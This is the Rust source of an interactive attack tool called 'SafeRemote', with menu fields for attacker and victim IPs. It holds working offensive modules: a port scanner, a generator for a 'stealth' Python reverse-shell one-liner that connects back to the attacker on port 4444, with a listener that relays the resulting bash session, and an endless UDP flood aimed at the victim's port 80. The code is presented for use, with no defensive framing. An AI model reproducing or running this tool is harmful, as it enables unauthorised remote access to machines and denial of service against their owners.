use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream, UdpSocket};
use std::process::{Command};
use std::thread;
use std::time::Duration;

fn main() {
    if !is_root() {
        println!("\x1b[31m[!] CRITICAL: Suite must be run as ROOT (sudo).\x1b[0m");
        return;
    }

    let (mut a, mut v, mut t) = (String::from("Null"), String::from("Null"), String::from("Null"));
    let c = ["\x1b[37m", "\x1b[31m", "\x1b[0m", "\x1b[90m", "\x1b[32m", "\x1b[33m"]; 
    
    loop {
        let w = get_term_width();
        let pad = " ".repeat(if w > 63 { (w - 63) / 2 } else { 0 });
        print!("\x1b[2J\x1b[1;1H"); 

        render_logo(&pad, &c);
        println!("{}{}{}{}", pad, c[1], "─────────────────── REMOTE OPERATIONS SUITE ───────────────────", c[2]);

        print!("\n{}SafeRemote >>> ", pad); 
        io::stdout().flush().ok();
        
        let mut cmd = String::new();
        io::stdin().read_line(&mut cmd).ok();
        let cmd = cmd.trim().to_lowercase();

        if cmd == "exit" { break; }
        if cmd == "start" {
            config_loop(&mut a, &mut v, &mut t, w, &c);
        }
    }
}

// --- NATIVE TACTICAL MODULES ---

fn deploy_engine(t: &str, a: &str, v: &str, p: &str) {
    println!("\n{}[*] EXECUTING: {}\n", p, t);
    
    match t {
        "Port Scan [Native]" => {
            let common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 4444, 8080];
            println!("{}[*] Scanning {} for {} common services...", p, v, common_ports.len());
            
            for port in common_ports {
                let addr = format!("{}:{}", v, port);
                // Use a short timeout so the scan doesn't hang on closed ports
                if let Ok(_) = TcpStream::connect_timeout(&addr.parse().unwrap(), Duration::from_millis(300)) {
                    let service = match port {
                        22 => "SSH", 80 => "HTTP", 443 => "HTTPS", 4444 => "REVERSE-SHELL", _ => "UNKNOWN"
                    };
                    println!("{}[+] {} - PORT {} IS OPEN", p, service, port);
                }
            }
            println!("\n{}[*] Scan Complete.", p);
        },
        "Reverse Shell [Native]" => {
            let py = format!("python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"{}\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])' >/dev/null 2>&1 &", a);
            println!("{}[!] STEALTH PAYLOAD GENERATED:", p);
            println!("{}\x1b[32m{}\x1b[0m\n", p, py);
            
            let listener = TcpListener::bind("0.0.0.0:4444").unwrap();
            println!("{}[*] Listener active on 0.0.0.0:4444. Awaiting connection...", p);
            
            if let Ok((stream, addr)) = listener.accept() { 
                println!("\n{}[!] CONNECTION ESTABLISHED FROM: {}", p, addr);
                handle_io(stream); 
            }
        },
        "UDP Flood [Native]" => {
            let sock = UdpSocket::bind("0.0.0.0:0").unwrap();
            println!("{}[!] STRESS TEST RUNNING. Press Ctrl+C to terminate.", p);
            loop { let _ = sock.send_to(&[0u8; 1024], format!("{}:80", v)); }
        },
        _ => println!("{}[!] Module Pending Implementation.", p),
    }

    // --- CRITICAL FIX: The Pause ---
    print!("\n{}Press [ENTER] to return to menu...", p);
    io::stdout().flush().ok();
    io::stdin().read_line(&mut String::new()).ok();
}

// --- CORE UTILS (IO/Networking) ---

fn handle_io(mut s: TcpStream) {
    let mut r = s.try_clone().unwrap();
    thread::spawn(move || {
        let mut b = [0; 4096];
        while let Ok(n) = r.read(&mut b) {
            if n == 0 { break; }
            print!("{}", String::from_utf8_lossy(&b[..n]));
            io::stdout().flush().ok();
        }
    });
    let mut i = String::new();
    loop {
        i.clear(); io::stdin().read_line(&mut i).ok();
        if s.write_all(i.as_bytes()).is_err() { break; }
    }
}

fn auto_detect_ip(pad: &str) -> String {
    let ifaces = Command::new("ip").arg("-br").arg("addr").output().ok();
    if let Some(o) = ifaces {
        let out = String::from_utf8_lossy(&o.stdout);
        println!("\n{}Available Interfaces:\n{}", pad, out);
        print!("{}Interface Name (e.g. eth0) >>> ", pad); io::stdout().flush().ok();
        let mut iface = String::new(); io::stdin().read_line(&mut iface).ok();
        let ip = Command::new("sh").arg("-c")
            .arg(format!("ip addr show {} | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1", iface.trim()))
            .output().ok();
        if let Some(i_out) = ip {
            let found = String::from_utf8_lossy(&i_out.stdout).trim().to_string();
            if !found.is_empty() { return found; }
        }
    }
    String::from("Null")
}

// --- UI & MENUS ---

fn render_logo(pad: &str, c: &[&str]) {
    let logo = [
        (r#"  ____         __    "#, r#"   ____                      _      "#),
        (r#" / ___|  __ _ / _| ___"#, r#" |  _ \ ___ _ __ ___   ___ | |_ ___ "#),
        (r#" \___ \ / _` | |_ / _ \"#, r#"| |_) / _ \ '_ ` _ \ / _ \| __/ _ \"#),
        (r#"  ___) | (_| |  _|  __/"#, r#"|  _ <  __/ | | | | | (_) | ||  __/"#),
        (r#" |____/ \__,_|_|  \___|"#, r#"|_| \_\___|_| |_| |_|\___/\__\___|"#),
    ];
    for (l, r) in logo { println!("{}{}{}{}{}", pad, c[1], l, c[0], r); }
}

fn config_loop(a: &mut String, v: &mut String, t: &mut String, w: usize, c: &[&str]) {
    loop {
        let b_pad = " ".repeat(if w > 60 { (w - 60) / 2 } else { 0 });
        print!("\x1b[2J\x1b[1;1H");
        println!("\n\n{}{}╔════════════════════════════════════════════════════════╗", b_pad, c[1]);
        println!("{}{}║  [0] ATTACKER_IP : {:<35} ║", b_pad, c[1], a);
        println!("{}{}║  [1] VICTIM_INFO : {:<35} ║", b_pad, c[1], v);
        println!("{}{}║  [2] VECTOR_TYPE : {:<35} ║", b_pad, c[1], t);
        println!("{}{}╚════════════════════════════════════════════════════════╝", b_pad, c[1]);
        println!("{}{} [B] BACK    [R] DEPLOY", b_pad, c[0]);
        
        print!("\n{}>>> ", b_pad); io::stdout().flush().ok();
        let mut choice = String::new(); io::stdin().read_line(&mut choice).ok();
        match choice.trim().to_lowercase().as_str() {
            "0" => { 
                println!("\n{}[1] Manual [2] Auto-detect", b_pad);
                let mut s = String::new(); io::stdin().read_line(&mut s).ok();
                if s.trim() == "2" { *a = auto_detect_ip(&b_pad); }
                else { print!("IP: "); io::stdout().flush().ok(); a.clear(); io::stdin().read_line(a).ok(); *a = a.trim().to_string(); }
            },
            "1" => { print!("Victim IP: "); io::stdout().flush().ok(); v.clear(); io::stdin().read_line(v).ok(); *v = v.trim().to_string(); },
            "2" => { 
                let list = ["Port Scan [Native]", "Reverse Shell [Native]", "UDP Flood [Native]"];
                for (i, name) in list.iter().enumerate() { println!("{}[{}] {}", b_pad, i, name); }
                let mut id = String::new(); io::stdin().read_line(&mut id).ok();
                if let Ok(idx) = id.trim().parse::<usize>() { if idx < list.len() { *t = list[idx].to_string(); } }
            },
            "r" => { 
                if a == "Null" || v == "Null" { println!("{}[!] Error: Set IPs first.", b_pad); thread::sleep(Duration::from_secs(1)); }
                else { deploy_engine(t, a, v, &b_pad); }
            },
            "b" => break,
            _ => (),
        }
    }
}

fn is_root() -> bool { Command::new("id").arg("-u").output().map(|o| String::from_utf8_lossy(&o.stdout).trim() == "0").unwrap_or(false) }
fn get_term_width() -> usize { Command::new("stty").arg("size").arg("-F").arg("/dev/tty").output().map(|o| String::from_utf8_lossy(&o.stdout).split_whitespace().nth(1).unwrap().parse().unwrap_or(80)).unwrap_or(80) }